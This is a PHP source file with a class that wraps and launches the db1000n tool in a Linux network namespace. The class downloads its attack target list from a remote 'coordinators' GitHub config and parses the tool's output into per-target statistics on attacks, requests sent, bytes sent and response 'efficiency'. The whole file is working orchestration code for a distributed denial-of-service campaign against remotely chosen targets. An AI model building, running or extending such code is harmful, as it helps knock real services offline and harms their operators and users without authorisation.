 <?php

class HackApplication
{
    private $log = '',
            $instantLog = false,
            $readChildProcessOutput = false,
            $process,
            $processPGid,
            $pipes,
            $wasLaunched = false,
            $launchFailed = false,
            $currentCountry = '',
            $netnsName,
            $targetsStat = [],
            $showInfoMessages;

    const   targetStatsInitial = [
            'attacking'          => 0,
            'requests_attempted' => 0,
            'requests_sent'      => 0,
            'responses_received' => 0,
            'bytes_sent'         => 0
        ];

    public function __construct($netnsName)
    {
        $this->netnsName = $netnsName;
        $this->showInfoMessages = SelfUpdate::isDevelopmentVersion();
    }

    public function processLaunch()
    {
        if ($this->launchFailed) {
            return -1;
        }

        if ($this->wasLaunched) {
            return true;
        }

        $command = "export GOMAXPROCS=1 ;   sleep 1 ;   "
				 . "ip netns exec {$this->netnsName}   nice -n 10   "
				 . "/sbin/runuser -p -u hack-app -g hack-app   --   "
                 . __DIR__ . "/DB1000N/db1000n  -prometheus_on=false  " . static::getCmdArgsForConfig()
                 . "  2>&1";

        $this->log($command);
        $descriptorSpec = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "a")   // stderr
        );
        $this->process = proc_open($command, $descriptorSpec, $this->pipes);
        $this->processPGid = procChangePGid($this->process, $log);
        $this->log($log);
        if ($this->processPGid === false) {
            $this->terminate(true);
            $this->log('Command failed: ' . $command);
            $this->launchFailed = true;
            return -1;
        }

        stream_set_blocking($this->pipes[1], false);
        $this->wasLaunched = true;
        return true;
    }

    private function log($message, $noLineEnd = false)
    {
        $message .= $noLineEnd  ?  '' : "\n";
        $this->log .= $message;
        if ($this->instantLog) {
            echo $message;
        }
    }

    public function clearLog()
    {
        $this->log = '';
    }

    public function setReadChildProcessOutput($state)
    {
        $this->readChildProcessOutput = $state;
    }

    public function getLog() : string
    {
        $ret = $this->log;

        if (!$this->readChildProcessOutput) {
            goto retu;
        }

        //------------------- read db1000n stdout -------------------

        $output = streamReadLines($this->pipes[1], 0.1);
        // --- Split lines
        $linesArray = mbSplitLines($output);
        // --- Remove empty lines
        $linesArray = mbRemoveEmptyLinesFromArray($linesArray);

        foreach ($linesArray as $line) {
            $lineObj = json_decode($line);
            if (is_object($lineObj)) {

                if (
                        $lineObj->level === 'info'
                    &&  $lineObj->msg   === 'location info'
                ) {
                    $this->currentCountry = $lineObj->country;
                }
                //--------------------------------------------------------------
                else if (
                        $lineObj->level  === 'info'
                    &&  $lineObj->msg    === 'stats'
                ) {
                    if ($lineObj->target !== 'total') {
                        $targetName = $lineObj->target;
                        $targetStats = $this->targetsStat[$targetName] ?? HackApplication::targetStatsInitial;
                        $targetStats['requests_attempted'] += (int) $lineObj->requests_attempted;
                        $targetStats['requests_sent']      += (int) $lineObj->requests_sent;
                        $targetStats['responses_received'] += (int) $lineObj->responses_received;
                        $targetStats['bytes_sent']         += (int) $lineObj->bytes_sent;
                        $this->targetsStat[$targetName] = $targetStats;
                    }
                }
                //--------------------------------------------------------------
                else if (
                        $lineObj->level === 'info'
                    &&  in_array($lineObj->msg, ['attacking', 'single http request'])
                ) {
                    $targetName = $lineObj->target;
                    $targetStats = $this->targetsStat[$targetName] ?? HackApplication::targetStatsInitial;
                    $targetStats['attacking'] ++;
                    $this->targetsStat[$targetName] = $targetStats;
                }
                //--------------------------------------------------------------
                else if (
                        $lineObj->level !== 'info'
                    ||  $this->showInfoMessages
                ){
                    $ret .= $line . "\n";
                }

            } else {
                $ret .= $line . "\n";
            }
        }

        retu:
        return mbRTrim($ret);
    }

    public function getStatisticsBadge() : string
    {
        global $LOG_WIDTH, $LOG_PADDING_LEFT;
        $columnWidth = 10;
        $ret = '';

        if (! count($this->targetsStat)) {
            return '';
        }

        ksort($this->targetsStat);
        //------- calculate the longest target name
        $targetNameMaxLength = 0;
        foreach ($this->targetsStat as $targetName => $targetStats) {
            $targetNameMaxLength = max($targetNameMaxLength, mb_strlen($targetName));
        }
        //$targetNamePaddedLineLength = min($targetNameMaxLength $LOG_WIDTH - $LOG_PADDING_LEFT - $columnWidth * 4);
        $targetNamePaddedLineLength = $LOG_WIDTH - $LOG_PADDING_LEFT - $columnWidth * 4;

        //------- Title rows
        $ret .= str_pad('Targets statistic', $targetNamePaddedLineLength);
        $columnNames = [
            'Requests',
            'Requests',
            'Responses',
            'MiB'
        ];
        foreach ($columnNames as $columnName) {
            $columnNamePadded = mb_substr($columnName, 0, $columnWidth);
            $ret .= str_pad($columnNamePadded, $columnWidth, ' ', STR_PAD_LEFT);
        }
        $ret .= "\n";
        $ret .= str_pad("", $targetNamePaddedLineLength);
        $columnNames = [
            'attempted',
            'sent',
            'received',
            'sent'
        ];
        foreach ($columnNames as $columnName) {
            $columnNamePadded = mb_substr($columnName, 0, $columnWidth);
            $ret .= str_pad($columnNamePadded, $columnWidth, ' ', STR_PAD_LEFT);
        }
        $ret .= "\n\n";

        //------- Content rows
        $totalRequestsAttempted = 0;
        $totalRequestsSent = 0;
        $totalResponsesReceived = 0;
        $totalBytesSent = 0;

        foreach ($this->targetsStat as $targetName => $targetStats) {
            $totalRequestsAttempted  += $targetStats['requests_attempted'];
            $totalRequestsSent       += $targetStats['requests_sent'];
            $totalResponsesReceived  += $targetStats['responses_received'];
            $totalBytesSent          += $targetStats['bytes_sent'];
            $miBSent =  roundLarge($targetStats['bytes_sent'] / 1024 / 1024, 1);

            $targetNameCut = mb_substr($targetName, 0, $targetNamePaddedLineLength - 2);
            $ret .= str_pad($targetNameCut, $targetNamePaddedLineLength);
            $ret .= str_pad($targetStats['requests_attempted'], $columnWidth, ' ', STR_PAD_LEFT);
            $ret .= str_pad($targetStats['requests_sent'], $columnWidth, ' ', STR_PAD_LEFT);
            $ret .= str_pad($targetStats['responses_received'], $columnWidth, ' ', STR_PAD_LEFT);
            $ret .= str_pad($miBSent, $columnWidth, ' ', STR_PAD_LEFT);
            $ret .= "\n";
        }

        //------- Total row

        $ret .= "\n";
        $totalMiBSent = roundLarge($totalBytesSent / 1024 / 1024, 1);
        $ret .= str_pad('Total', $targetNamePaddedLineLength);
        $ret .= str_pad($totalRequestsAttempted, $columnWidth, ' ', STR_PAD_LEFT);
        $ret .= str_pad($totalRequestsSent, $columnWidth, ' ', STR_PAD_LEFT);
        $ret .= str_pad($totalResponsesReceived, $columnWidth, ' ', STR_PAD_LEFT);
        $ret .= str_pad($totalMiBSent, $columnWidth, ' ', STR_PAD_LEFT);
        $ret .= "\n";

        return $ret;
    }

    private function calculatePrometheusPort()
    {
        $indexDigits = preg_replace('#[^\d]#', '', $this->netnsName);
        $this->prometheusPort = '9' . str_repeat('0', 3 - strlen($indexDigits)) . $indexDigits;
    }

    // Should be called after getLog()
    public function getCurrentCountry()
    {
        return $this->currentCountry;
    }

    // Should be called after getLog()
    // \d+:([^:]+).*?\n.*?\n.*?\n\s+(\d+).*?\n.*?\n\s+(\d+)
    public function getEfficiencyLevel()
    {
        if (! count($this->targetsStat)) {
            return null;
        }

        $totalRequestsAttempted = 0;
        $totalResponsesReceived = 0;
        foreach ($this->targetsStat as $target => $targetsStat) {
            if (preg_match('#https?:#', strtolower($target), $matches) > 0) {
                $totalRequestsAttempted += $targetsStat['requests_attempted'];
                $totalResponsesReceived += $targetsStat['responses_received'];
            }
        }

        if (! $totalRequestsAttempted) {
            return null;
        }

        $averageResponseRate = $totalResponsesReceived * 100 / $totalRequestsAttempted;
        return roundLarge($averageResponseRate);
    }

    public function isAlive()
    {
        return isProcAlive($this->process);
    }

    // Only first call of this function return real value, next calls return -1
    public function getExitCode()
    {
        $processStatus = proc_get_status($this->process);
        return $processStatus['exitcode'];
    }

    public function terminate($hasError = false)
    {
        global $LOG_BADGE_WIDTH;

        if ($this->processPGid) {
            $this->log(str_repeat(' ', $LOG_BADGE_WIDTH + 3) . "db1000n SIGTERM PGID -{$this->processPGid}");
            @posix_kill(0 - $this->processPGid, SIGTERM);
        }
        @proc_terminate($this->process);
    }

    public function getProcess()
    {
        return $this->process;
    }

    // ----------------------  Static part of the class ----------------------

    private static $configUrl,
                   $localConfigPath,
                   $useLocalConfig;


    public static function constructStatic()
    {
        global $TEMP_DIR;
        static::$configUrl = 'https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json';
        static::$localConfigPath = $TEMP_DIR . '/db1000n-config.json';
        static::$useLocalConfig = false;
    }

    private static function loadConfig()
    {
        $config = httpGet(static::$configUrl);
        if ($config !== false) {
            echo "Config file for db1000n downloaded from " . static::$configUrl . "\n";
            file_put_contents_secure(static::$localConfigPath, $config);
			chmod(static::$localConfigPath, changeLinuxPermissions(0, 'rw', 'r', 'r'));
        } else {
            echo "Failed to downloaded config file for db1000n\n";
        }
    }

    private static function getCmdArgsForConfig()
    {
        if (! static::$useLocalConfig) {
            return '';
        }

        return ' -c "' . static::$localConfigPath . '" ';
    }
    
    public static function reset()
    {
        @unlink(static::$localConfigPath);
        static::loadConfig();
        if (file_exists(static::$localConfigPath)) {
            static::$useLocalConfig = true;
        } else {
            static::$useLocalConfig = false;
        }
    }
}

HackApplication::constructStatic();